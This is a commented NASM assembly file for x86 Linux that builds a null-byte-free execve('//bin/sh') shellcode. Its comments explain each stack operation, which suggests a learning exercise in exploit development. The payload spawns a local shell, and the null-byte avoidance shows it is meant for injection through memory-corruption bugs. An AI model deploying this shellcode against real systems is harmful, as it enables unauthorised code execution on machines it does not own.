;execve-stack.nasm
;execve //bin/sh
;Linux x86
;Sanjiv Kawa (@skawasec)
;www.popped.io
;Decemeber 2, 2016


global _start

section .text
_start:

  xor eax, eax  ;zero out eax
  push eax      ;push 00000000 on to the stack


  push 0x68732f6e ;push hex hs/n on to the stack
  push 0x69622f2f ;push hex ib// on to the stack

  ;at this point the stack contains //bin/sh0x00000000
  mov ebx, esp  ;this satisfies the requirements for *filename (first argument of execve)

  push eax      ;push 00000000 on to the stack

  ;at this point the stack contains 0x00000000//bin/sh0x00000000
  mov edx, esp  ;we cant pop 0x00000000 into EDX as the shellcode cannot have any null characters.
                ;instead we move the current address pointed to by ESP into EDX.
                ;this address contains the last value pushed on to the stack, which is 0x00000000
                ;this satisfies the requirements for envp (third argument of execve)

  push ebx      ;ebx contains the memory address of the stack where //bin/sh0x00000000 is.
  mov ecx, esp  ;this satisfies the requirements for argv (second argument of execve)

  mov al, 11     ;execve syscall number, 0xb works also.
  int 0x80       ;initiate
